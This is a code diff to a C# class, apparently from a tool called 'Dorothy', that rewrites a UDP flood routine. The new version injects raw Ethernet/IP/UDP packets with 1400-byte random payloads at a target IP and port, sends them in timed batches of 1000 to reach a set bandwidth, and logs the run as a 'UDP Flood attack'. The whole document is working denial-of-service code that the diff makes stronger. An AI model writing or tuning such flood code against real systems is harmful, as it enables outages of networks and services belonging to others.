@@ -59,48 +59,67 @@ namespace Dorothy.Models
                     throw new Exception($"Device {_device.Name} does not support packet injection.");
                 }
 
-                // Construct the Ethernet packet
-                var ethernetPacket = new EthernetPacket(_sourceMac, new PhysicalAddress(_targetMac), EthernetType.IPv4);
-                
-                // Construct the IP packet
-                var ipPacket = new IPv4Packet(IPAddress.Parse(_sourceIp), IPAddress.Parse(_targetIp))
+                var random = new Random();
+                var ethernetPacket = new EthernetPacket(
+                    _sourceMac,
+                    new PhysicalAddress(_targetMac),
+                    EthernetType.IPv4);
+
+                var ipPacket = new IPv4Packet(
+                    IPAddress.Parse(_sourceIp),
+                    IPAddress.Parse(_targetIp))
                 {
-                    Protocol = ProtocolType.Udp,
-                    TimeToLive = 128
+                    Protocol = ProtocolType.Udp
                 };
-                var udpPacket = new UdpPacket(12345, (ushort)_targetPort)
+
+                var udpPacket = new UdpPacket(
+                    0,
+                    (ushort)_targetPort)
                 {
-                    // Additional UDP properties can be set here if needed
+                    PayloadData = new byte[1400]
                 };
-                
-                // Assign the UDP packet to the IP packet's payload
+
+                random.NextBytes(udpPacket.PayloadData);
                 ipPacket.PayloadPacket = udpPacket;
-                
-                // Assign the IP packet to the Ethernet packet's payload
                 ethernetPacket.PayloadPacket = ipPacket;
 
-                // Calculate packets per second based on bytes per second
                 double packetSize = ethernetPacket.Bytes.Length;
-                int packetsPerSecond = (int)(_bytesPerSecond / packetSize);
-                packetsPerSecond = Math.Max(packetsPerSecond, 1); // Ensure at least 1 packet per second
-                double delay = 1000.0 / packetsPerSecond;
+                int packetsPerSecond = (int)Math.Ceiling(_bytesPerSecond / packetSize);
+                int batchSize = 1000;
+                double delayMicroseconds = (1_000_000.0 * batchSize) / packetsPerSecond;
 
                 Logger.Info($"UDP Flood: Sending {packetsPerSecond} packets per second ({_bytesPerSecond / 125_000} Mbps).");
 
-                while (!_cancellationToken.IsCancellationRequested)
+                await Task.Run(() =>
                 {
-                    try
+                    var stopwatch = new System.Diagnostics.Stopwatch();
+                    while (!_cancellationToken.IsCancellationRequested)
                     {
-                        injectionDevice.SendPacket(ethernetPacket);
-                    }
-                    catch (Exception ex)
-                    {
-                        Logger.Error(ex, "Failed to send UDP packet.");
-                    }
+                        try
+                        {
+                            stopwatch.Restart();
+                            for (int i = 0; i < batchSize && !_cancellationToken.IsCancellationRequested; i++)
+                            {
+                                injectionDevice.SendPacket(ethernetPacket);
+                            }
 
-                    await Task.Delay(TimeSpan.FromMilliseconds(delay), _cancellationToken)
-                        .ContinueWith(t => { }, TaskContinuationOptions.OnlyOnCanceled);
-                }
+                            double elapsedMicroseconds = stopwatch.ElapsedTicks * 1_000_000.0 / System.Diagnostics.Stopwatch.Frequency;
+                            if (elapsedMicroseconds < delayMicroseconds)
+                            {
+                                int remainingMicroseconds = (int)(delayMicroseconds - elapsedMicroseconds);
+                                if (remainingMicroseconds > 1000)
+                                {
+                                    Thread.Sleep(remainingMicroseconds / 1000);
+                                }
+                            }
+                        }
+                        catch (Exception ex)
+                        {
+                            Logger.Error(ex, "Failed to send UDP packet.");
+                        }
+                    }
+                    return Task.CompletedTask;
+                }, _cancellationToken);
             }
             catch (TaskCanceledException)
             {
@@ -108,7 +127,8 @@ namespace Dorothy.Models
             }
             catch (Exception ex)
             {
-                Logger.Error(ex, "Error during UDP Flood attack.");
+                Logger.Error(ex, "UDP Flood attack failed.");
+                throw;
             }
             finally
             {
